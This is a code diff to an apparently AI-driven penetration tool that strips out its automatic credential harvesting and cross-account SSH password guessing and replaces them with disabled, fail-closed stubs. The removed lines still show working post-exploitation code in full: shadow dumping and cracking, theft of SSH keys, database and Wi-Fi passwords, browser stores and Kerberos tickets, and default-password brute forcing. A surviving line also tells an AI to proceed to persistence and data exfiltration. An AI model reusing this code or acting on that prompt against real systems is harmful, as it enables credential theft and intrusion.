@@ -204,126 +204,20 @@ def _run_linpeas(client, timeout: int = 180) -> tuple:
 
 
 def _harvest_credentials(client, host: str) -> str:
-    """Post-exploitation credential harvesting.
-    Called after successful privilege escalation."""
-    output = f"\n{'=' * 50}\n[CREDENTIAL HARVEST -- {host}]\n{'=' * 50}\n"
-    print(f"\n    {C_GREEN}[*] Harvesting credentials...{C_RESET}")
-    started = time.time()
-    max_seconds = int(CFG.get("killchain", {}).get("credential_harvest_timeout", 45))
-    auto_crack = bool(CFG.get("killchain", {}).get("auto_crack_after_privesc", False))
+    """Fail closed: control-plane reports never collect credential material.
 
-    def budget_left() -> bool:
-        return (time.time() - started) < max_seconds
+    Secrets may be revealed only for the immediate authentication call of a
+    typed provider. Reading password databases, private keys, application
+    configuration, Wi-Fi PSKs, browser stores, or tickets would create
+    unbounded plaintext intermediate state and report output.
+    """
 
-    # 1. Shadow dump for local cracking
-    shadow_dump = _ssh_exec(client, "cat /etc/shadow 2>/dev/null", timeout=10)
-    if not shadow_dump or "$" not in shadow_dump:
-        shadow_dump = _ssh_exec(client, "sudo -n cat /etc/shadow 2>/dev/null", timeout=10)
-
-    if shadow_dump and "$" in shadow_dump:
-        shadow_file = f"/tmp/octopus_shadow_{host.replace('.', '_')}.txt"
-        try:
-            with open(shadow_file, "w") as sf:
-                sf.write(shadow_dump)
-            output += f"\n[SHADOW DUMP -> {shadow_file}]\n{shadow_dump[:3000]}\n"
-            print(f"    {C_GREEN}[+] Shadow saved to {shadow_file}{C_RESET}")
-
-            if auto_crack and budget_left():
-                try:
-                    from hash_cracker import HashCracker
-
-                    hc = HashCracker()
-                    hc.timeout = min(getattr(hc, "timeout", 600), max(20, max_seconds - int(time.time() - started)))
-                    crack_result = hc.smart_crack(shadow_dump)
-                    output += f"\n{crack_result}\n"
-                    for cracked_user, cracked_pwd in hc.get_cracked_pairs():
-                        try:
-                            from core.credentials import register_credential
-
-                            register_credential("ssh", host, cracked_user, cracked_pwd)
-                        except ImportError:
-                            pass
-                    hc.cleanup()
-                except ImportError:
-                    output += f"\nAI: Shadow hashes extracted. Use [TOOL: crack_hashes {shadow_file}] for local GPU cracking.\n"
-            else:
-                output += (
-                    f"\nAI: Shadow hashes extracted. Use [TOOL: crack_hashes {shadow_file}] for local GPU cracking.\n"
-                )
-        except Exception as e:
-            output += f"\n[!] Failed to save shadow: {e}\n"
-
-    # 2. SSH private keys
-    if not budget_left():
-        output += f"\n[!] Credential harvest budget reached ({max_seconds}s); skipped remaining checks.\n"
-        return output
-    ssh_keys = _ssh_exec(
-        client, "find /root /home -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' 2>/dev/null", timeout=10
+    del client
+    return (
+        f"\n{'=' * 50}\n[CREDENTIAL BOUNDARY -- {host}]\n{'=' * 50}\n"
+        "[!] Automatic credential harvesting is disabled. No credential "
+        "material was read, retained, cracked, or added to the report.\n"
     )
-    if ssh_keys.strip():
-        output += "\n[SSH PRIVATE KEYS]\n"
-        for key_path in ssh_keys.strip().splitlines()[:5]:
-            key_path = key_path.strip()
-            if key_path:
-                key_content = _ssh_exec(client, f"cat '{key_path}' 2>/dev/null", timeout=5)
-                if key_content and "PRIVATE KEY" in key_content:
-                    output += f"  {key_path}:\n{key_content[:500]}\n"
-                    print(f"    {C_GREEN}[+] SSH key: {key_path}{C_RESET}")
-
-    # 3. Database credentials
-    if not budget_left():
-        output += f"\n[!] Credential harvest budget reached ({max_seconds}s); skipped remaining checks.\n"
-        return output
-    db_creds = _ssh_exec(
-        client,
-        "grep -rn 'password\\|passwd\\|db_pass\\|DB_PASS' "
-        "/etc/mysql/ /etc/postgresql/ /var/www/ /opt/ "
-        "2>/dev/null | grep -v Binary | head -20",
-        timeout=15,
-    )
-    if db_creds.strip():
-        output += f"\n[DATABASE CREDENTIALS]\n{db_creds[:2000]}\n"
-        print(f"    {C_GREEN}[+] DB credentials found{C_RESET}")
-
-    # 4. WiFi passwords
-    if not budget_left():
-        output += f"\n[!] Credential harvest budget reached ({max_seconds}s); skipped remaining checks.\n"
-        return output
-    wifi = _ssh_exec(
-        client, "find /etc/NetworkManager -name '*.nmconnection' -exec grep -l psk {} \\; 2>/dev/null", timeout=5
-    )
-    if wifi.strip():
-        for wf in wifi.strip().splitlines()[:3]:
-            wf = wf.strip()
-            wifi_content = _ssh_exec(client, f"cat '{wf}' 2>/dev/null", timeout=5)
-            if wifi_content:
-                output += f"\n[WIFI CONFIG: {wf}]\n{wifi_content}\n"
-
-    # 5. Browser credentials / history
-    if not budget_left():
-        output += f"\n[!] Credential harvest budget reached ({max_seconds}s); skipped remaining checks.\n"
-        return output
-    browser_files = _ssh_exec(
-        client,
-        "find /root /home -name 'Login Data' -o -name 'key4.db' -o -name 'logins.json' 2>/dev/null | head -5",
-        timeout=10,
-    )
-    if browser_files.strip():
-        output += "\n[BROWSER CREDENTIAL FILES]\n"
-        for bf in browser_files.strip().splitlines():
-            output += f"  {bf.strip()}\n"
-        output += "  AI: Extract with [CMD: python3 -c 'from lazagne.all import *; computer_password(print)'] or manual DPAPI.\n"
-
-    # 6. Kerberos tickets
-    if not budget_left():
-        output += f"\n[!] Credential harvest budget reached ({max_seconds}s); skipped remaining checks.\n"
-        return output
-    krb = _ssh_exec(client, "find /tmp -name 'krb5cc_*' 2>/dev/null", timeout=5)
-    if krb.strip():
-        output += f"\n[KERBEROS TICKETS]\n{krb}\n"
-        output += "  AI: Use tickets for lateral movement.\n"
-
-    return output
 
 
 def run_privesc(host: str, user: str, password: str, port: int = 22) -> str:
@@ -965,118 +859,12 @@ void gconv_init() {
             output += "\nAI: ROOT ACCESS OBTAINED. Proceed to persistence and data exfil.\n"
             return output
 
-        # Test discovered users.
-        # Try SSH login for key users with known passwords
-        # Uses direct SSH connect (never hangs — has 3s timeout per attempt)
-        import time as _time
-
-        import paramiko as _paramiko
-
-        print(f"\n    {C_CYAN}[*] Testing user credentials (root + discovered users)...{C_RESET}")
-        output += f"\n{'═' * 60}\n"
-        output += "[USER CREDENTIAL TESTING]\n"
-
-        # Get login users from /etc/passwd
-        try:
-            passwd_out = _ssh_exec(client, "cat /etc/passwd 2>/dev/null", timeout=8)
-        except Exception:
-            passwd_out = ""
-        login_users = []
-        for line in passwd_out.splitlines():
-            p = line.split(":")
-            if len(p) >= 7 and p[6] not in ("/usr/sbin/nologin", "/bin/false", "/sbin/nologin", "/bin/nologin", ""):
-                uname = p[0]
-                if uname not in (
-                    "daemon",
-                    "bin",
-                    "sys",
-                    "sync",
-                    "games",
-                    "man",
-                    "lp",
-                    "mail",
-                    "news",
-                    "nobody",
-                    user,
-                ):  # skip current user but keep root
-                    login_users.append(uname)
-
-        # Ensure root is tested FIRST (most valuable)
-        if "root" in login_users:
-            login_users.remove("root")
-        login_users.insert(0, "root")
-
-        output += f"  Testing: {', '.join(login_users[:5])}{'...' if len(login_users) > 5 else ''}\n"
-
-        # Known passwords — deduplicated, prioritized
-        known_passwords = [password, "root", "toor", "admin", "123456"]
-        known_passwords = list(dict.fromkeys(known_passwords))[:3]  # max 3
-
-        tested = 0
-        successful_logins = []
-        section_start = _time.time()
-        SECTION_TIMEOUT = 25  # hard cap: 25 seconds for entire section
-
-        for target_user in login_users[:5]:  # max 5 users
-            if _time.time() - section_start > SECTION_TIMEOUT:
-                output += f"  [!] Section timeout ({SECTION_TIMEOUT}s) — stopping user tests.\n"
-                print(f"    {C_YELLOW}[!] User testing timeout{C_RESET}")
-                break
-
-            for pwd_attempt in known_passwords:
-                if _time.time() - section_start > SECTION_TIMEOUT:
-                    break
-                tested += 1
-                try:
-                    test_client = _paramiko.SSHClient()
-                    test_client.set_missing_host_key_policy(_paramiko.AutoAddPolicy())
-                    test_client.connect(
-                        host,
-                        port=port,
-                        username=target_user,
-                        password=pwd_attempt,
-                        timeout=3,  # fast timeout
-                        allow_agent=False,
-                        look_for_keys=False,
-                        banner_timeout=5,
-                    )
-                    # Login succeeded!
-                    _, stdout, _ = test_client.exec_command("id", timeout=3)
-                    id_out = stdout.read().decode("utf-8", errors="replace").strip()
-                    test_client.close()
-
-                    successful_logins.append({"user": target_user, "password": pwd_attempt, "id": id_out[:100]})
-                    output += f"  [+] SSH {target_user}:{pwd_attempt} → {id_out[:80]}\n"
-                    print(f"    {C_GREEN}[+] LOGIN: {target_user}:{pwd_attempt} → {id_out[:60]}{C_RESET}")
-
-                    try:
-                        from core.credentials import register_credential
-
-                        register_credential("ssh", host, target_user, pwd_attempt)
-                    except ImportError:
-                        pass
-
-                    if "uid=0" in id_out:
-                        got_root = True
-                        output += f"  [+] ✓ ROOT VIA SSH login as {target_user}!\n"
-                        print(f"    {C_GREEN}[+] ✓ ROOT ACCESS via {target_user}!{C_RESET}")
-                    break  # got this user, move to next
-
-                except _paramiko.AuthenticationException:
-                    pass  # wrong password
-                except Exception:
-                    break  # connection error, skip this user entirely
-
-                _time.sleep(0.1)
-
-        elapsed = _time.time() - section_start
-        output += f"  Tested {tested} combinations in {elapsed:.1f}s\n"
-        if successful_logins:
-            output += f"  Successful logins: {len(successful_logins)}\n"
-            for sl in successful_logins:
-                output += f"    ✓ {sl['user']}:{sl['password']} → {sl['id']}\n"
-        else:
-            output += "  No additional logins found.\n"
+        output += (
+            f"\n{'═' * 60}\n[CREDENTIAL REPLAY BOUNDARY]\n"
+            "[!] Cross-account password testing is disabled. The supplied "
+            "credential is used only for its original SSH authentication and "
+            "is never copied into a password pool or result structure.\n"
+        )
 
         # ── FINAL STATUS ─────────────────────────────────────────
         if got_root:
